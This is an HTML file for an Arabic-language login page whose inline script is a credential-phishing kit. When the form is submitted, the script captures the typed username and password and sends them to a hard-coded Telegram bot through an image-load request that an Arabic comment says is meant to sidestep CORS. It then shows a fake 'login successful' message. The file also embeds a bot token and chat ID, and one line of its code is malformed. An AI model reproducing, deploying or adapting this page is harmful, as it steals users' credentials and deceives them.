<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: Tahoma, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); width: 300px; }
        .login-box h2 { text-align: center; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 5px; }
        .input-group input { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        button { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

    <div class="login-box">
        <h2>تسجيل الدخول</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="username">اسم المستخدم</label>
                <input type="text" id="username" required>
            </div>
            <div class="input-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" id="submitBtn">دخول</button>
        </form>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "9249129764:AAEz54D8XAUW9Puc-WKZCtH68RQ1No7M6gl";
        const CHAT_ID = "6032043580";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username53' || document.getElementById('username').value); // لضمان قراءة اليوزر صح
            const usernameVal = document.getElementById('username').value;
            const passVal = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');

            btn.disabled = true;
            btn.innerText = 'جاري التحقق...';

            const message = `🚨 تم التقاط بيانات جديدة!\n\n👤 المستخدم: ${usernameVal}\n🔑 الباسورد: ${passVal}`;
            
            // رابط الإرسال المباشر لتليجرام بصيغة GET لتجنب مشاكل CORS تماماً
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

            // إرسال الطلب في الخلفية فوراً
            const img = new Image();
            img.src = url;

            setTimeout(() => {
                alert('تم تسجيل الدخول بنجاح!');
                // لو حابب تحوله لصفحة تانية بعد التسجيل:
                // window.location.href = "https://google.com";
                btn.disabled = false;
                btn.innerText = 'دخول';
            }, 1000);
        });
    </script>

</body>
</html>
